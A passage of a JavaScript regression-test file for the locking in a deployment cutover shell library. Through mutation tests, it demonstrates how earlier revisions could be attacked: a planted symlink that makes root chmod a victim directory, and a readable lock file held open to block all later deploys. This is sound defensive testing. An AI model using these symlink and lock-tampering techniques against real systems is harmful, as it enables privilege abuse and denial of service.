    assert.match(run.stdout, /^DIRECTORY=REFUSED$/m, `and a descriptor on anything but a regular file:\n${run.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the identity comparison removed, which is what the code
    // did before r22 — nothing at all asked what the fd was on. The swapped case is then accepted,
    // and with it every symlink the fd was opened through.
    const body = shellFunction(CUTOVER_NS_LIB, 'verify_held_lock')
    const IDENTITY = '  [[ -n "${ident}" && "${named}" == "${ident}" ]] || return 1'
    assert.ok(body.includes(IDENTITY), `the shipped check must prove the fd is the name's own inode:\n${body}`)
    const mutated = runR9(entry, [], [
      body.replace(IDENTITY, '  : "${ident}" "${named}"'),
      'printf "" > "${CUTOVER_STATE_DIR}/m-real.lock"',
      'printf "" > "${CUTOVER_STATE_DIR}/m-other.lock"',
      'exec 9<"${CUTOVER_STATE_DIR}/m-real.lock"',
      'mv -f "${CUTOVER_STATE_DIR}/m-other.lock" "${CUTOVER_STATE_DIR}/m-real.lock"',
      'verify_held_lock 9 "${CUTOVER_STATE_DIR}/m-real.lock" && echo MUTANT_SWAPPED=OK || echo MUTANT_SWAPPED=REFUSED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^MUTANT_SWAPPED=OK$/m,
      `without it the run believes a descriptor it never related to the name it locked:\n${mutated.stdout}`)
  })

  test(`${entry.name} does not chown or chmod what a symlink at the DB fence directory points at`, () => {
    /**
     * CRITICAL 2, EXHIBITED. ROUTE: the shipped acquire_cutover_lock() -> ensure_cutover_state_dirs()
     * -> own_service_subdir() -> enter_service_subdir(), with a REAL symlink-to-directory at
     * ${DB_FENCE_DIR}. What is measured is the victim directory's OWNER AND MODE, before and after.
     */
    const run = runR9(entry, ['acquire_cutover_lock'], [
      'mkdir -p "${CUTOVER_ROOT_DIR}" "${CUTOVER_STATE_DIR}/victimdir"',
      'chmod 755 "${CUTOVER_STATE_DIR}/victimdir"',
      'echo "BEFORE=$(LC_ALL=C stat -c "%a" "${CUTOVER_STATE_DIR}/victimdir")"',
      'ln -s "${CUTOVER_STATE_DIR}/victimdir" "${DB_FENCE_DIR}"',
      ...NAMESPACE_OUTCOME,
      'echo "AFTER=$(LC_ALL=C stat -c "%a" "${CUTOVER_STATE_DIR}/victimdir")"',
      '[[ -L "${DB_FENCE_DIR}" ]] && echo LINK_LEFT_ALONE || echo LINK_TOUCHED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))

    assert.match(run.stdout, /^BEFORE=755$/m, `the victim must start reachable, or this test measures nothing:\n${run.stdout}`)
    assert.match(run.stdout, /^RC=1$/m, `a symlink where a directory must be created ends the run:\n${run.stdout}`)
    assert.match(run.stdout, /^AFTER=755$/m,
      `and its target must not be chmodded, because a chmod OF A PATHNAME has no --no-dereference on Linux:\n${run.stdout}`)
    assert.match(run.stdout, /is a symbolic link, not a directory/,
      `and the refusal must name what it found rather than following it:\n${run.stdout}`)
    assert.match(run.stdout, /^LINK_LEFT_ALONE$/m, `and nothing may be done to the entry either:\n${run.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the retired trio, in its own shell, over the same planted
    // link. `mkdir -p` reports success on a symlink-to-directory, and the `chmod` that follows
    // dereferences it — so the target ends up at the mode this installer chose for a directory it
    // believes it created.
    const mutated = runR9(entry, [], [
      'mkdir -p "${CUTOVER_STATE_DIR}/victimdir2"',
      'chmod 755 "${CUTOVER_STATE_DIR}/victimdir2"',
      'ln -s "${CUTOVER_STATE_DIR}/victimdir2" "${CUTOVER_STATE_DIR}/planted-fence"',
      'DB_FENCE_DIR="${CUTOVER_STATE_DIR}/planted-fence"',
      'mkdir -p "$DB_FENCE_DIR" && echo PRE_R22_ACCEPTED_THE_LINK',
      'chmod 700 "$DB_FENCE_DIR" 2>/dev/null || true',
      'echo "MUTANT_AFTER=$(LC_ALL=C stat -c "%a" "${CUTOVER_STATE_DIR}/victimdir2")"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^PRE_R22_ACCEPTED_THE_LINK$/m,
      `\`mkdir -p\` sees a directory and returns 0 — that is the half of the finding nobody looks at:\n${mutated.stdout}`)
    assert.match(mutated.stdout, /^MUTANT_AFTER=700$/m,
      `and the chmod then dereferences it as root — that is the other half:\n${mutated.stdout}`)
  })

  test(`${entry.name} takes a lock no other account can open, and narrows one an older run left wide`, () => {
    /**
     * o3d-secops r23, Codex HIGH. THE LOCK'S MODE IS LOAD-BEARING AND r22 DROPPED THE ASSERTION.
     *
     * `flock(2)` applies to the OPEN FILE DESCRIPTION whatever its access mode — which is why the
     * lock is opened O_RDONLY in the first place — so READ permission on this file is permission
     * to hold the cutover exclusion. ${CUTOVER_ROOT_DIR} has to be traversable by ${APP_USER}
     * because ${DB_FENCE_DIR} lives under it; at 0644 that account could open this file, take
     * `flock -n`, and refuse every deploy, update and install on the box for as long as it liked.
     *
     * r22's objection was right and is answered rather than overruled: the mode is SET, not
     * asserted. Four cases, and the middle two are what "set rather than asserted" means.
     */
    const shipped = runR9(entry, ['acquire_cutover_lock'], [
      ...NAMESPACE_OUTCOME_INLINE,
      // The bits that matter, spelled out: nothing outside the owner may read it, so nothing
      // outside the owner may open it, so nothing outside the owner may hold this lock.
      'echo "GROUPOTHER=$(( $(LC_ALL=C stat -c "0%a" "${LOCK_FILE}") & 0077 ))"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(shipped.stdout, /^RC=0$/m, shipped.stdout)
    assert.match(shipped.stdout, /^LOCK=regular (empty )?file 600$/m, `the lock this run creates must be 0600:\n${shipped.stdout}`)
    assert.match(shipped.stdout, /^GROUPOTHER=0$/m,
      `with no bit set for group or other — that, and not the parent's mode, is what stops another account taking this lock:\n${shipped.stdout}`)

    // AN AMBIENT UMASK CANNOT PRODUCE A WIDE LOCK. The creation runs under a STATED umask, so a
    // host whose umask is 022 gets the same 0600. This is the case r22 said an assertion would
    // turn into a refused cutover; setting the mode means there is nothing left to refuse.
    const ambient = runR9(entry, ['acquire_cutover_lock'], [
      'umask 000',
      ...NAMESPACE_OUTCOME_INLINE,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(ambient.stdout, /^RC=0$/m,
      `an ambient umask may not refuse a cutover — that was the objection to asserting the mode:\n${ambient.stdout}`)
    assert.match(ambient.stdout, /^LOCK=regular (empty )?file 600$/m,
      `and it may not produce a wide lock either:\n${ambient.stdout}`)

    // AND A HOST UPGRADING FROM r22 HAS ONE ALREADY, AT 0644. It is narrowed rather than refused.
    const upgraded = runR9(entry, ['acquire_cutover_lock'], [
      'mkdir -p "${CUTOVER_ROOT_DIR}"',
      '( umask 022; : > "${LOCK_FILE}" )',
      'echo "BEFORE=$(LC_ALL=C stat -c "%a" "${LOCK_FILE}")"',
      ...NAMESPACE_OUTCOME_INLINE,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(upgraded.stdout, /^BEFORE=644$/m, `the fixture must start wide, or this measures nothing:\n${upgraded.stdout}`)
    assert.match(upgraded.stdout, /^RC=0$/m, `and the cutover must still run:\n${upgraded.stdout}`)
    assert.match(upgraded.stdout, /^LOCK=regular (empty )?file 600$/m,
      `and the lock left behind by the previous checkout must be narrowed, not merely complained about:\n${upgraded.stdout}`)

    // MUTATION A, ROUTE STATED: the stated umask put back to r22's, with narrow_held_lock intact.
    // The file is created 0644 and the narrowing repairs it — which is the whole claim that the
    // property is a FACT and not an assertion about the environment.
    const PREPARE = shellFunction(CUTOVER_NS_LIB, 'prepare_cutover_lock_file')
    const STATED_UMASK = '( umask 077; set -C; : > "${path}" )'
    assert.ok(PREPARE.includes(STATED_UMASK), `the shipped creation must state its own umask:\n${PREPARE}`)
    // r24: with the rotation stubbed out, so what is measured here is still the NARROWING alone —
    // the two repairs both end at 0600 and this case would otherwise stop distinguishing them.
    const wideCreate = runR9(entry, ['acquire_cutover_lock'], [
      PREPARE.replace(STATED_UMASK, '( umask 022; set -C; : > "${path}" )'),
      'rotate_cutover_lock_inode() { return 0; }',
      ...NAMESPACE_OUTCOME_INLINE,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(wideCreate.stdout, /^LOCK=regular (empty )?file 600$/m,
      `the narrowing must be what makes the mode true, so that no umask anywhere decides it:\n${wideCreate.stdout}`)

    // MUTATION B, ROUTE STATED: and with BOTH gone, which is r22 exactly. 0644, and the run
    // reports an exclusion any account able to open that file could have taken first.
    //
    // THE THIRD STUB IS r24's AND IS WHY THIS MUTATION CHANGED (o3d-secops r24, Codex MEDIUM).
    // r24 added a SECOND repair for a wide inherited lock — rotate_cutover_lock_inode(), which
    // replaces the inode rather than narrowing it, because `chmod` cannot reach a descriptor
    // somebody already holds. It leaves a 0600 lock too, so with only the two r23 stubs in place
    // this mutation would no longer reproduce r22 and would pass while measuring nothing. What is
    // being exhibited is unchanged; reproducing it now takes removing both repairs.
    const ACQUIRE = shellFunction(CUTOVER_NS_LIB, 'acquire_cutover_lock')
    const NARROW = '  narrow_held_lock 9 || die'
    assert.ok(ACQUIRE.includes(NARROW), `the shipped acquisition must narrow the descriptor it locks:\n${ACQUIRE}`)
    assert.ok(ACQUIRE.includes('rotate_cutover_lock_inode "$LOCK_FILE" || die'),
      `and replace one it inherited wide, rather than believing a chmod reached a descriptor somebody already had:\n${ACQUIRE}`)
    const pre23 = runR9(entry, ['acquire_cutover_lock'], [
      PREPARE.replace(STATED_UMASK, '( umask 022; set -C; : > "${path}" )'),
      'narrow_held_lock() { return 0; }',
      'rotate_cutover_lock_inode() { return 0; }',
      ...NAMESPACE_OUTCOME_INLINE,
      'echo "MUTANT_GROUPOTHER=$(( $(LC_ALL=C stat -c "0%a" "${LOCK_FILE}") & 0077 ))"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(pre23.stdout, /^RC=0$/m, pre23.stdout)
    assert.match(pre23.stdout, /^LOCK=regular (empty )?file 644$/m,
      `r22 left a world-readable lock — that is the finding:\n${pre23.stdout}`)
    assert.match(pre23.stdout, /^MUTANT_GROUPOTHER=36$/m,
      `readable by group and other, and readable is holdable:\n${pre23.stdout}`)

    // AND THE READ-BACK IS NOT VACUOUS. With the chmod neutered — a read-only mount, an immutable
    // attribute — narrow_held_lock() must REFUSE rather than report a mode it did not set.
    const refused = runR9(entry, ['acquire_cutover_lock'], [
      PREPARE.replace(STATED_UMASK, '( umask 022; set -C; : > "${path}" )'),
      'chmod() { return 0; }',
      ...NAMESPACE_OUTCOME,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(refused.stdout, /^RC=1$/m,
      `a mode this run could not set must end the run, not be assumed:\n${refused.stdout}`)
    assert.match(refused.stdout, /could not be narrowed to 0600/,
      `and say what it could not establish:\n${refused.stdout}`)
  })

  test(`${entry.name} replaces a lock inode that was ever openable by another account, so a descriptor opened while it was wide cannot block a later cutover`, () => {
    /**
     * o3d-secops r24, Codex MEDIUM. PERMISSION IS CHECKED AT `open(2)` AND NEVER AGAIN.
     *
     * r23 narrowed an inherited 0644 lock to 0600 on the descriptor, proved the new mode off that
     * same descriptor, and concluded that only a privileged account could now take this lock. It
     * revokes nothing already held: on a host upgraded from a checkout that left this file at
     * 0644, ${APP_USER} can have opened it BEFORE the cutover started, WITHOUT locking it — an
     * open is invisible where a lock is not — and the `chmod` does not touch that descriptor. The
     * instant this cutover exits, that process `flock`s what it has been holding all along and
     * every deploy, update and install afterwards dies at the exclusion with nothing to point at.
     *
     * ROUTE: the shipped acquire_cutover_lock() over a 0644 lock, with a real unlocked descriptor
     * open on it across the whole run, and then the two questions that matter — can the holdout
     * take a lock, and does anything it takes block the NEXT cutover.
     */
    const fixture = [
      'mkdir -p "${CUTOVER_ROOT_DIR}"',
      '( umask 022; : > "${LOCK_FILE}" )',
      'echo "BEFORE=$(LC_ALL=C stat -c "%a" "${LOCK_FILE}")"',
      'old_inode="$(LC_ALL=C stat -c "%i" "${LOCK_FILE}")"',
      // THE HOLDOUT. Opened while the file is wide, and deliberately NOT locked: that is the state
      // nothing the cutover looks at can see, and it is the whole of the attack.
      'exec 5<"${LOCK_FILE}"',
    ]
    const measure = [
      'echo "AFTER=$(LC_ALL=C stat -c "%a" "${LOCK_FILE}")"',
      '[[ "${old_inode}" == "$(LC_ALL=C stat -c "%i" "${LOCK_FILE}")" ]] && echo INODE=SAME || echo INODE=REPLACED',
      // The holdout now takes the lock it could have taken at any point.
      'flock -n 5 && echo HOLDOUT=LOCKED || echo HOLDOUT=BLOCKED',
      // AND THE NEXT CUTOVER. A fresh descriptor on the canonical NAME, which is what every later
      // deploy, update and install opens.
      '( exec 7<"${LOCK_FILE}"; flock -n 7 && echo NEXT=FREE || echo NEXT=BLOCKED )',
    ]
    // A WHOLE CUTOVER, START TO FINISH: the subshell's descriptors die with it, which is what a run
    // that has completed leaves behind. Only then is the holdout asked what it can do.
    const RUN = 'rc=0; ( acquire_cutover_lock; echo "RC=0" ) || rc=$?; [[ "${rc}" -eq 0 ]] || echo "RC=${rc}"'

    const shipped = runR9(entry, ['acquire_cutover_lock'], [...fixture, RUN, ...measure].join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(shipped.stdout, /^BEFORE=644$/m, `the fixture must start wide, or this measures nothing:\n${shipped.stdout}`)
    assert.match(shipped.stdout, /^RC=0$/m, `and an upgraded host must still be able to run a cutover:\n${shipped.stdout}`)
    assert.match(shipped.stdout, /^AFTER=600$/m, `whose lock ends 0600:\n${shipped.stdout}`)
    assert.match(shipped.stdout, /^INODE=REPLACED$/m,
      `and the wide inode must be REPLACED rather than narrowed — narrowing cannot reach a descriptor that is already open:\n${shipped.stdout}`)
    assert.match(shipped.stdout, /^HOLDOUT=LOCKED$/m,
      `the holdout still gets its lock, because nothing can take a descriptor back — that is the point:\n${shipped.stdout}`)
    assert.match(shipped.stdout, /^NEXT=FREE$/m,
      `but the lock it gets is on an inode with no name, so the next cutover is not blocked by it:\n${shipped.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the replacement stubbed out to report success and do
    // nothing, which is r23 exactly — the narrowing runs, the mode reads back 0600, and the run
    // reports an exclusion the holdout can take away from every future cutover on the box.
    const ACQUIRE = shellFunction(CUTOVER_NS_LIB, 'acquire_cutover_lock')
    assert.ok(ACQUIRE.includes('rotate_cutover_lock_inode "$LOCK_FILE" || die'),
      `the shipped acquisition must replace a lock it inherited wide:\n${ACQUIRE}`)
    const r23 = runR9(entry, ['acquire_cutover_lock'], [
      'rotate_cutover_lock_inode() { return 0; }',
      ...fixture, RUN, ...measure,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(r23.stdout, /^AFTER=600$/m, `r23 left the mode looking right:\n${r23.stdout}`)
    assert.match(r23.stdout, /^INODE=SAME$/m, `on the same inode the holdout is holding:\n${r23.stdout}`)
    assert.match(r23.stdout, /^HOLDOUT=LOCKED$/m, `which it then locks:\n${r23.stdout}`)
    assert.match(r23.stdout, /^NEXT=BLOCKED$/m,
      `and every later deploy, update and install is refused by a descriptor a chmod could not reach — that is the finding:\n${r23.stdout}`)
  })

  test(`${entry.name} rotates only a lock it inherited wide, and never one a predecessor is holding`, () => {
    /**
     * WHAT REPLACING AN INODE COSTS, AND WHY IT IS PAID SAFELY (o3d-secops r24).
     *
     * Replacing the canonical inode means giving up exclusion against anything still holding the
     * old one — which is exactly what defeats the holdout, and would be a disaster if a GENUINE
     * concurrent cutover were the holder. It cannot be: the rotation is reached only after this
     * run holds `flock` on the inherited inode, so at the instant of the rename nothing else holds
     * that lock. Both halves are measured here.
     *
     * ROUTE: the shipped acquire_cutover_lock(), twice. Once against a predecessor that HOLDS the
     * lock — which must refuse and must leave the predecessor's inode exactly where it is — and
     * once on an ordinary 0600 lock, which must not be rotated at all.
     */
    const predecessor = runR9(entry, ['acquire_cutover_lock'], [
      'mkdir -p "${CUTOVER_ROOT_DIR}"',
      '( umask 022; : > "${LOCK_FILE}" )',
      'old_inode="$(LC_ALL=C stat -c "%i" "${LOCK_FILE}")"',
      // A GENUINE PREDECESSOR: it holds the lock, on the wide inode, exactly as a cutover launched
      // a moment earlier from the pre-r24 checkout would.
      'exec 5<"${LOCK_FILE}"',
      'flock -n 5 && echo PREDECESSOR=HELD || echo PREDECESSOR=FAILED',
      'rc=0; ( acquire_cutover_lock ) 2>&1 || rc=$?; echo "RC=${rc}"',
      '[[ "${old_inode}" == "$(LC_ALL=C stat -c "%i" "${LOCK_FILE}")" ]] && echo INODE=SAME || echo INODE=REPLACED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(predecessor.stdout, /^PREDECESSOR=HELD$/m,
      `the predecessor must actually hold the lock, or this test measures nothing:\n${predecessor.stdout}`)
    assert.match(predecessor.stdout, /^RC=1$/m, `and the second cutover must refuse:\n${predecessor.stdout}`)
    assert.match(predecessor.stdout, /Refusing to run two cutovers at once/,
      `saying which exclusion it could not take:\n${predecessor.stdout}`)
    assert.match(predecessor.stdout, /NOTHING HAS BEEN ROTATED/,
      `and saying that the replacement was not reached:\n${predecessor.stdout}`)
    assert.match(predecessor.stdout, /^INODE=SAME$/m,
      `because a predecessor's inode may never be swapped out from under it — the rotation runs only while THIS run holds the lock:\n${predecessor.stdout}`)

    // AND THE GATE IS NOT VACUOUS: an ordinary 0600 lock is left alone, so the canonical inode is
    // stable from one cutover to the next and the replacement is a one-time repair.
    const TWO_RUNS = [
      '( acquire_cutover_lock; echo "RUN1=0" ) || echo "RUN1=FAILED"',
      'first="$(LC_ALL=C stat -c "%i" "${LOCK_FILE}")"',
      '( acquire_cutover_lock; echo "RUN2=0" ) || echo "RUN2=FAILED"',
      '[[ "${first}" == "$(LC_ALL=C stat -c "%i" "${LOCK_FILE}")" ]] && echo STABLE=yes || echo STABLE=no',
    ]
    const ordinary = runR9(entry, ['acquire_cutover_lock'], TWO_RUNS.join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(ordinary.stdout, /^RUN1=0$/m, ordinary.stdout)
    assert.match(ordinary.stdout, /^RUN2=0$/m, ordinary.stdout)
    assert.match(ordinary.stdout, /^STABLE=yes$/m,
      `a lock this run created at 0600 was never openable by anybody else, so there is nothing to replace:\n${ordinary.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the gate answered "never private", so every run rotates.
    // The inode then changes underneath a host that had nothing wrong with it, which is the churn
    // the mode question exists to avoid.
    const GATE = shellFunction(CUTOVER_NS_LIB, 'lock_mode_is_private')
    assert.ok(GATE.includes('(( (8#${mode} & 0077) == 0 )) || return 1'),
      `the gate must ask about group and other, and about READ as much as write:\n${GATE}`)
    const alwaysRotates = runR9(entry, ['acquire_cutover_lock'], [
      'lock_mode_is_private() { return 1; }',
      ...TWO_RUNS,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(alwaysRotates.stdout, /^STABLE=no$/m,
      `without it the canonical inode is replaced on every cutover:\n${alwaysRotates.stdout}`)

    // AND THE REPLACEMENT IS OPENED FOR READING AND LOCKED BEFORE IT IS PUBLISHED. A source-shaped
    // check about GRAMMAR, for the reason the r22 one gives: the behaviour above cannot show that
    // the next edit keeps the property.
    const ROTATE = shellFunction(CUTOVER_NS_LIB, 'rotate_cutover_lock_inode')
    assert.ok(ROTATE.includes('exec 6<"${temporary}"') && !/exec 6>/.test(ROTATE),
      `the replacement must be opened for READING, like the lock it replaces:\n${ROTATE}`)
    assert.ok(ROTATE.indexOf('flock -n 6') < ROTATE.indexOf('mv -f "${temporary}" "${path}"'),
      `and locked BEFORE the rename publishes its name, or there is an instant in which the canonical name is unlocked:\n${ROTATE}`)
    assert.ok(ACQUIRE_ORDER(shellFunction(CUTOVER_NS_LIB, 'acquire_cutover_lock')),
      'and the rotation must come after the exclusion is taken, never before it')
  })

  test(`${entry.name} claims no exclusion over the pre-r22 lock, and says so on every run`, () => {
    /**
     * o3d-secops r23, Codex CRITICAL. THE BRIDGE r22 SHIPPED IS GONE, AND THIS IS WHY.
     *
     * r22 also locked `${CUTOVER_STATE_DIR}/cutover.lock` so a cutover already running from the
     * previous checkout stayed excluded. A predecessor holds an INODE; the bridge opened a NAME,
     * inside a directory ${APP_USER} owns. That account can rename the entry out from under the
     * locked inode and leave a fresh regular file at the name, and every check the bridge made —
     * lstat says regular file, the descriptor is that name's own inode — passes on the
     * REPLACEMENT. The run then reported an exclusion it had never taken.
     *
     * SO THE TEST IS THE OTHER WAY ROUND NOW. What is asserted is that a run holding a lock on
     * the old name is NOT excluded by this one (the honest state), that nothing is opened,
     * created or locked at a name the service account controls, and that the limitation is stated
     * UNCONDITIONALLY — keying it on whether that name exists would be reading an absence as an
     * answer at a name the adversary controls, which is the same mistake one layer up.
     *
     * ROUTE: the shipped acquire_cutover_lock(), which calls state_pre_r22_cutovers_are_not_excluded().
     */
    const held = runR9(entry, ['acquire_cutover_lock'], [
      // A "predecessor" holding the pre-r22 name, from a child that keeps its descriptor open.
      'printf "" > "${CUTOVER_STATE_DIR}/cutover.lock"',
      'exec 4<"${CUTOVER_STATE_DIR}/cutover.lock"',
      'flock -n 4 && echo PREDECESSOR_HOLDS || echo PREDECESSOR_FAILED',
      ...NAMESPACE_OUTCOME_INLINE,
      // Nothing may have been done to that name, and this run must not report it excluded.
      'echo "OLDLOCK=$(LC_ALL=C stat -c "%F %s" "${CUTOVER_STATE_DIR}/cutover.lock" 2>/dev/null || echo missing)"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(held.stdout, /^PREDECESSOR_HOLDS$/m, `the fixture must actually hold the old lock:\n${held.stdout}`)
    assert.match(held.stdout, /^RC=0$/m,
      `and this run still takes its own lock — the old name may not stop every cutover on the box:\n${held.stdout}`)
    assert.match(held.stdout, /NOTHING HERE CAN EXCLUDE IT/,
      `and it must say plainly that a pre-r22 cutover is not excluded, rather than reporting a continuity it cannot establish:\n${held.stdout}`)
    assert.match(held.stdout, /docs\/installation\.md/,
      `and send the reader to where the requirement they have to satisfy is written down:\n${held.stdout}`)
    assert.match(held.stdout, /^OLDLOCK=regular (empty )?file 0$/m,
      `and nothing may be written through that name:\n${held.stdout}`)

    // AND THE STATEMENT IS UNCONDITIONAL. With no entry at the old name at all — which proves
    // nothing, because the account that owns that directory can unlink it — the same sentence is
    // printed. A version that only warned when the file existed would go quiet exactly when an
    // adversary wanted it to.
    const absent = runR9(entry, ['acquire_cutover_lock'], [
      ...NAMESPACE_OUTCOME_INLINE,
      '[[ -e "${CUTOVER_STATE_DIR}/cutover.lock" ]] && echo OLD_NAME_CREATED || echo OLD_NAME_UNTOUCHED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(absent.stdout, /^RC=0$/m, absent.stdout)
    assert.match(absent.stdout, /NOTHING HERE CAN EXCLUDE IT/,
      `the limitation is a property of the relocation, not of what happens to be on the disk:\n${absent.stdout}`)
    assert.match(absent.stdout, /^OLD_NAME_UNTOUCHED$/m,
      `and nothing may be created at a name the service account controls — that was the r22 finding:\n${absent.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the statement removed. Without it the run is silent
    // about a population its lock does not cover, which is what "reads as covered" means.
    const body = shellFunction(CUTOVER_NS_LIB, 'state_pre_r22_cutovers_are_not_excluded')
    assert.ok(body.includes('NOTHING HERE CAN EXCLUDE IT'), `the shipped statement must name what is not excluded:\n${body}`)
    const mutated = runR9(entry, ['acquire_cutover_lock'], [
      'state_pre_r22_cutovers_are_not_excluded() { return 0; }',
      ...NAMESPACE_OUTCOME_INLINE,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^RC=0$/m, mutated.stdout)
    assert.ok(!/NOTHING HERE CAN EXCLUDE IT/.test(mutated.stdout),
      `without it the run says nothing at all about the cutovers it cannot exclude:\n${mutated.stdout}`)
  })

  test(`${entry.name} takes the /var/lib/ims-deploy lock only where that directory is private to this run`, () => {
    /**
     * THE ONE CONTINUITY CLAIM THAT SURVIVES, AND ITS PRECONDITION PROVED RATHER THAN ASSUMED
     * (o3d-secops r23). A lock on a name inside a directory somebody else may write proves
     * nothing; a lock on a name inside a directory only this run may write does. So the claim is
     * made where dir_is_private_to_this_run() says it can be, and abandoned — loudly, with
     * nothing opened or created — where it cannot.
     *
     * ROUTE: the shipped acquire_legacy_namespace_lock(), through acquire_cutover_lock().
     */
    const priv = runR9(entry, ['acquire_cutover_lock'], [
      'mkdir -p "${LEGACY_CUTOVER_STATE_DIR}"',
      'chmod 755 "${LEGACY_CUTOVER_STATE_DIR}"',
      ...NAMESPACE_OUTCOME_INLINE,
      '( exec 5<"${LEGACY_CUTOVER_STATE_DIR}/deploy.lock"; flock -n 5 && echo LEGACY_FREE || echo LEGACY_HELD )',
      'echo "LEGACYMODE=$(LC_ALL=C stat -c "%a" "${LEGACY_CUTOVER_STATE_DIR}/deploy.lock" 2>/dev/null || echo missing)"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(priv.stdout, /^RC=0$/m, priv.stdout)
    assert.match(priv.stdout, /^LEGACY_HELD$/m,
      `where the directory is this run's own, the exclusion is real and must be taken:\n${priv.stdout}`)
    assert.match(priv.stdout, /^LEGACYMODE=600$/m,
      `and that lock is narrowed too — a readable lock file is a holdable one:\n${priv.stdout}`)

    // AND WHERE IT IS NOT. A world-writable legacy directory is one in which the entry can be
    // renamed between a predecessor's open and this one's, so nothing is opened, nothing is
    // created, and what is not excluded is named.
    const shared = runR9(entry, ['acquire_cutover_lock'], [
      'mkdir -p "${LEGACY_CUTOVER_STATE_DIR}"',
      'chmod 777 "${LEGACY_CUTOVER_STATE_DIR}"',
      ...NAMESPACE_OUTCOME_INLINE,
      '[[ -e "${LEGACY_CUTOVER_STATE_DIR}/deploy.lock" ]] && echo LEGACY_LOCK_CREATED || echo LEGACY_LOCK_ABSENT',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(shared.stdout, /^RC=0$/m, shared.stdout)
    assert.match(shared.stdout, /^LEGACY_LOCK_ABSENT$/m,
      `nothing may be created as root at a name another account can replace:\n${shared.stdout}`)
    assert.match(shared.stdout, /is not a directory only this run may write/,
      `and the run must say why it is claiming nothing there:\n${shared.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the precondition removed, which is r22's behaviour
    // exactly. The lock is then taken inside a directory anybody can rename entries in, and the
    // run reports an exclusion that proves nothing about who is running.
    const guard = shellFunction(CUTOVER_NS_LIB, 'acquire_legacy_namespace_lock')
    const PRECONDITION = '  if ! dir_is_private_to_this_run "${LEGACY_CUTOVER_STATE_DIR}"; then'
    assert.ok(guard.includes(PRECONDITION), `the shipped claim must be conditional on its precondition:\n${guard}`)
    const mutated = runR9(entry, ['acquire_cutover_lock'], [
      guard.replace(PRECONDITION, '  if false; then'),
      'mkdir -p "${LEGACY_CUTOVER_STATE_DIR}"',
      'chmod 777 "${LEGACY_CUTOVER_STATE_DIR}"',
      ...NAMESPACE_OUTCOME_INLINE,
      '[[ -e "${LEGACY_CUTOVER_STATE_DIR}/deploy.lock" ]] && echo MUTANT_LOCK_CREATED || echo MUTANT_LOCK_ABSENT',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^MUTANT_LOCK_CREATED$/m,
      `without the precondition the run creates and locks a name in a directory anybody may write:\n${mutated.stdout}`)
  })

  test(`${entry.name} names a connection-fence record left at the pre-r22 path and does not read it`, () => {
    // A record at the old path lists the grantees a fence revoked CONNECT from. Importing it would
    // make root act on GRANT statements chosen by the account being defended against, which is the
    // r22 HIGH with a different file in it. So the NAME is reported and the bytes are left alone.
    const run = runR9(entry, ['acquire_cutover_lock'], [
      'mkdir -p "${CUTOVER_STATE_DIR}/deploy"',
      'printf "{\\"grantees\\":[\\"postgres\\"]}\\n" > "${LEGACY_STATE_DIR_DB_FENCE_STATE}"',
      ...NAMESPACE_OUTCOME,
      '[[ -e "${DB_FENCE_STATE}" ]] && echo IMPORTED || echo NOT_IMPORTED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(run.stdout, /^RC=0$/m, run.stdout)
    assert.match(run.stdout, /^NOT_IMPORTED$/m,
      `root does not take GRANT statements out of the service account's own directory:\n${run.stdout}`)
    assert.match(run.stdout, /IT HAS NOT BEEN READ AND IT WILL NOT BE/,
      `and the operator must be told the record is there and why it is being ignored:\n${run.stdout}`)
  })
}

test('[o3d-secops r22] the cutover namespace is one definition, in the library the three entrypoints source', () => {
  // THE POINT OF THE LIFT, ASSERTED. Three byte-identical copies is how the r9 lock split and the
  // r20 namespace split both survived a round; the walk that would have made either of these two
  // paths safe existed in install.sh and only in install.sh.
  const lib = readFileSync(CUTOVER_NS_LIB_PATH, 'utf8')
  for (const name of CUTOVER_NS_OWNED) {
    assert.equal(shellFunctionDefinitions(lib, name, 'scripts/lib/cutover-namespace.sh').length, 1,
      `${name}() must be defined exactly once, in the library`)
    for (const entry of R9_SCRIPTS) {
      assert.equal(shellFunctionDefinitions(entry.source, name, entry.name).length, 0,
        `${entry.name} must not carry its own ${name}() — that is the shape of every one of these findings`)
    }
  }
